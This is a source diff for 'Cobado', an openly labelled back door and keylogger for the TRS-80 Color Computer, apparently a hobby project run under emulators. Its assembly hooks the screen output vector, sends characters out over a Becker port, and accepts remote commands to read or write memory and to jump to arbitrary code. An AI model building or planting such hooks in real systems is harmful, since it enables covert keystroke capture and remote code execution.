@@ -1,5 +1,4 @@
 
-
 // Cobado - A CoCo Back Door (keylogger) [All for good reasons]
 
 // The idea of Cobado came to me tonight. I wanted a simple system for
@@ -29,10 +28,19 @@
 // Eventually, I want a RS232 version of this idea. Im using the Becker Port
 // ATM because VCC/XRoar dont support serial comunications.
 
+#include <stdlib.h>
+#include <conio.h>
+#include <string.h>
+
+#define COBADO_EXEC 0x1d1
+
+extern byte cobado_start[1];
+extern byte cobado_end[1];
+
 asm void cobado_install(void)
 {
     asm {
-        cobado_install:
+        _cobado_start:
         leax    cobado_vector3,pcr
         cmpx    $168
         beq     cobado_uninstall
@@ -44,6 +52,7 @@ asm void cobado_install(void)
         sta     $167
         stx     $168
         rts
+
         cobado_uninstall:
         lda     vector3+0,pcr
         sta     $167
@@ -51,18 +60,24 @@ asm void cobado_install(void)
         std     $168
         rts
 
+        vector3:
+        fcb     0,0,0
+
+        request_time:
+        fdb     0
+
         cobado_vector3:
         bsr     vector3
-        pshs    d,x,y,u
-        tst     111                                 // test devnum
-        bne     do_nothing                          // return if not screen
+        pshs    d,x,y
+        tst     $6f                                 // test devnum
+        bne     do_return                           // return if not screen
         bsr     becker_send_a                       // send screen char
 
         command_loop:
         bsr     becker_a
-        beq     do_nothing                          // #0
+        beq     do_uninstall                        // #0
         deca
-        beq     do_uninstall                        // #1
+        beq     do_return                           // #1
         deca
         beq     do_chrout                           // #2
         deca
@@ -70,19 +85,14 @@ asm void cobado_install(void)
         deca
         beq     do_setmem                           // #4
         deca
-        beq     do_memset                           // #5
-        deca
-        beq     do_memcpy                           // #6
-        deca
-        beq     do_jsrmem                           // #7
-
+        beq     do_jsrmem                           // #5
         bra     command_loop
 
         do_uninstall:
         bsr     cobado_uninstall
 
-        do_nothing:
-        puls    d,x,y,u,pc
+        do_return:
+        puls    d,x,y,pc
 
         do_chrout:
         bsr     becker_a                            // chr to output
@@ -92,6 +102,7 @@ asm void cobado_install(void)
         do_getmem:
         bsr     becker_x                            // src
         bsr     becker_y                            // count
+        addd    #0
         beq     command_loop
         do_getmem_loop:
         lda     ,x+
@@ -103,38 +114,13 @@ asm void cobado_install(void)
         do_setmem:
         bsr     becker_x                            // dst
         bsr     becker_y                            // count
-        cmpy    #0
+        addd    #0
         beq     command_loop
         do_setmem_loop:
         bsr     becker_a
         sta     ,x+
         dey
         bne     do_setmem_loop
-        bra     command_loop
-
-        do_memcpy:
-        bsr     becker_x                            // dst
-        bsr     becker_u                            // src
-        bsr     becker_y                            // count
-        beq     command_loop
-        do_memcpy_loop:
-        lda     ,u+
-        sta     ,x+
-        dey
-        bne     do_memcpy_loop
-        bra     command_loop
-
-        do_memset:
-        bsr     becker_x                            // dst
-        bsr     becker_a                            // value
-        tfr     d,y                                 // save a in y
-        bsr     becker_d                            // count
-        beq     command_loop
-        exg     d,y                                 // restore a and y = count
-        do_memset_loop:
-        sta     ,x+
-        dey
-        bne     do_memset_loop
         bra     command_loop
 
         do_jsrmem:
@@ -163,10 +149,10 @@ becker_a_loop:
         pshs    b
         ldd     $112
         subd    request_time,pcr
-        cmpd    #2*60
+        subd    #2*60
         puls    b
         blo     becker_a_loop
-        lda     #1                                  // failed: uninstall
+        clra                                        // failed: uninstall
         rts
 becker_a_success:
         lda     $ff42
@@ -182,23 +168,21 @@ becker_y:
         bsr     becker_d
         tfr     d,y
         rts
-
-becker_u:
-        bsr     becker_d
-        tfr     d,u
-        rts
-
-vector3:
-        fcb     0,0,0
-
-request_time:
-        fdb     0
+_cobado_end:
     }
 }
 
 int main(void)
 {
-    cobado_install();
+    size_t size = cobado_end - cobado_start;
+
+    clrscr();
+    cprintf("COBADO SIZE: %d\n", size);
+    memcpy(COBADO_EXEC, cobado_start, size);
+    cputs("SAVING COBADO TO DISK ...\n\n");
+    systemf("SAVEM \"COBADO.BIN\",%u,%u,%u", COBADO_EXEC, COBADO_EXEC + size, COBADO_EXEC);
+    cputs("DONE. TO INSTALL USE:\n\n");
+    cputs("LOADM\"COBADO.BIN\":EXEC\n");
     return 0;
 }
 
